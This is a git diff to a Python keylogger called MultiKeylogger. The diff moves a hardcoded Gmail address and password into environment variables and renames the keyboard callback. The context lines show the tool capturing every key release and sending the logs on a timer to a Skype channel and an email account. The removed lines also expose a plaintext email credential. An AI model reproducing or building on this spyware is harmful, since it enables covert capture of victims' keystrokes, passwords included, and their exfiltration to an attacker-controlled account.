@@ -25,8 +25,8 @@ PHONE = os.environ['PHONE_NUMBER'] # Creates variable from .env phone number
 SKYPE_CHANNEL = os.environ['SKYPE_CHANNEL'] # Creates variable from .env skype channel id
 
 # Email Variables for report type of emails
-EMAIL = "ph4ntom77projects@gmail.com" # Email that reports are sent to
-EMAIL_PW = "keylogger!!" # Password for Email
+EMAIL = os.environ['ADDRESS'] # Email that reports are sent to
+EMAIL_PW = os.environ['PASSWORD'] # Password for Email
 
 # Time Interval Variable
 LOG_INTERVAL = 25 # Every 300 Seconds (5 minutes) a report is sent
@@ -99,7 +99,7 @@ class MultiKeylogger:
         skypeChannel = skype.chats.chat(SKYPE_CHANNEL) # Sets skypeChannel equal to the chat of a specific ID
         skypeChannel.sendMsg(skypeMessage) # Sends a message of the keylogs to the Skype group channel
 
-    def callbackKeyboard(self, event):
+    def keyboardCallback(self, event):
         eventName = "[" + event.name + "]"# Create eventName variable
         nameLength = len(eventName) # Returns the length of the eventName variable
         if nameLength > 1: # Conditional statement to format the appearence of the keylogs in event that they key is not a typical character like a letter or number. 
@@ -139,7 +139,7 @@ class MultiKeylogger:
 
     def start(self):
         self.startTimeVal = datetime.now() # Gets current date time
-        keyboard.on_release(callback = self.callbackKeyboard) # Initializes the keylogger on rlease of a key
+        keyboard.on_release(callback = self.keyboardCallback) # Initializes the keylogger on rlease of a key
         self.reportKeyLog() # Calls the function that records the keylogs within the time interval
         keyboard.wait() 
 
